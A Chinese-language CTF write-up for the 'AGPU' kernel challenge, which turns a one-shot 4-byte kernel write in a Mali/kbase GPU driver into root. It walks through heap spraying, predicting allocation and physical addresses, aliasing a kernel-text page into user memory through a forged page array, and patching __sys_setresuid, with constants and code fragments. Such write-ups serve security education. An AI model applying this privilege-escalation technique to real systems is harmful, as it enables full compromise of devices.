# AGPU

## 题目简述

题目是 aarch64 Linux 内核环境，加载了 Mali/kbase 风格 GPU 驱动。驱动额外给出一次 one-shot 4 字节任意内核虚拟地址写。解法利用 Mali allocation 中可预测的 page array，把目标物理页伪装成 GPU allocation 页映射到用户态，进而修改 kernel text 并提权读取 flag。

## 解题过程

驱动新增 ioctl：

```c
struct kbase_ioctl_ctf_write4 {
    __u64 addr;
    __u32 value;
    __u32 padding;
};

#define KBASE_IOCTL_CTF_WRITE4 \
    _IOW(KBASE_IOCTL_EXTRA_TYPE, 0, struct kbase_ioctl_ctf_write4)
```

核心实现是：

```c
if (atomic_cmpxchg(&kbase_ctf_write4_available, 1, 0) != 1)
    return -EPERM;

WRITE_ONCE(*addr, write4->value);
```

也就是只有一次 4 字节任意内核虚拟地址写。环境同时开启了 KASLR、`STRICT_KERNEL_RWX`、CFI、Shadow Call Stack，常规 ROP、`modprobe_path` 等路线都不合适。

Mali driver 的关键点在于“分配”和“映射”解耦。驱动会维护一组物理页数组，并允许这些页通过 GPU/CPU mapping 暴露给用户态。如果能改写 allocation 的 `pages[0]`，就能让用户态 mmap 到任意物理页。

相关结构如下：

```c
struct kbase_mem_phy_alloc {
    struct kref kref;
    atomic64_t gpu_mappings;
    atomic_t kernel_mappings;
    size_t nents;
    struct tagged_addr *pages;
    ...
};
```

native allocation 创建时，`pages` 紧跟在结构体后面：

```c
alloc_size = sizeof(*alloc) + sizeof(*alloc->pages) * nr_pages;
alloc->pages = (void *)(alloc + 1);
```

本题编译结果里：

```text
sizeof(struct kbase_mem_phy_alloc) == 0xc8
```

因此 `pages[0]` 位于 `alloc + 0xc8`。QEMU 环境中 vmalloc 布局稳定，spray 多个 context 与 allocation 后目标地址可预测：

```text
target alloc    = 0xffff800081c5f000
target pages[0] = 0xffff800081c5f0c8
```

spray 参数为：

```c
#define KCTX_COUNT       0x30U
#define ALLOCS_PER_KCTX 0x10U
#define VA_PAGES        ((0x10000U - 0x2000U) / 8U)
#define COMMIT_PAGES    4U
```

物理地址同样可预测。`-kernel Image` 启动时，Image 物理基址稳定为：

```text
Image physical base = 0x40200000
```

静态扫描 `Image` 选择要 patch 的 kernel text 页，镜像内偏移为 `0x4b000`，目标物理页为：

```text
0x40200000 + 0x4b000 = 0x4024b000
```

最终利用链：

```text
1. 打开多个 /dev/mali0，初始化多个 Mali context。
2. 每个 context 中申请多个 native memory allocation。
3. 对每个 allocation 做 mmap，但暂不触碰目标 mapping。
4. 用 KBASE_IOCTL_CTF_WRITE4 写目标 kbase_mem_phy_alloc->pages[0]。
5. 把 pages[0] 改成 0x4024b000。
6. 访问对应 Mali mapping，用户态第一页 alias 到 kernel text 物理页。
7. 通过这个 mapping patch __sys_setresuid。
8. 调用 setresuid(0,0,0) 获得 root 后读取 /flag。
```

具体 patch 目标是映射页内的两个分支判断字节：

```c
#define PATCH_OFF_1 0xaf7U
#define PATCH_OFF_2 0x38bU
#define PATCH_FROM  0x36U
#define PATCH_TO    0x37U
```

one-shot write 写入的是 `AAW_ADDR = target_alloc + 0xc8`，值为 `0x4024b000`。随后通过目标 allocation 的用户态 mapping 做：

```c
page[PATCH_OFF_1] = PATCH_TO;
page[PATCH_OFF_2] = PATCH_TO;
__sync_synchronize();
setresuid(0, 0, 0);
setresgid(0, 0, 0);
```

这条链的核心是：KASLR 改变的是内核运行时虚拟偏移，但在该启动方式下 raw `Image` 的物理装载位置稳定；GPU 映射路径又缺少 CPU 映射路径中的页类型检查，因此一次小写原语可以变成“把任意物理页映射到用户态”。

最终得到：

```text
ACTF{Ph4nt0mM4p_1s_4ll_y0u_n33d}
```

脚本多次尝试候选地址后命中目标，最终输出 flag，验证了地址搜索和利用链。

## 方法总结

- 核心技巧：改写 Mali allocation 的 page array，把 kernel text 物理页 alias 到用户态 mapping，再 patch 提权路径。
- 识别信号：aarch64 内核题给出 GPU driver 写 primitive、vmalloc spray 稳定、物理装载位置稳定时，应检查物理页数组和线性映射相关弱点。
- 复用要点：先证明目标结构体虚拟地址和目标物理页都可预测，再把 one-shot write 转化为可重复读写的用户态映射。
